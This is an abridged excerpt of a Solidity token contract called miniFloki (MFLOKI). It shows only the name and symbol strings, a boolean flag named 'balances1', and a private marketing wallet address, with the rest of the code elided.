...
contract MFLOKI is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "miniFloki";
    string public _symbol= "MFLOKI";
    bool balances1 = true;
    ...
    address private marketAddy = payable(0x919eB983eeB5dea703523744d8Fd46bd36aCEe51);
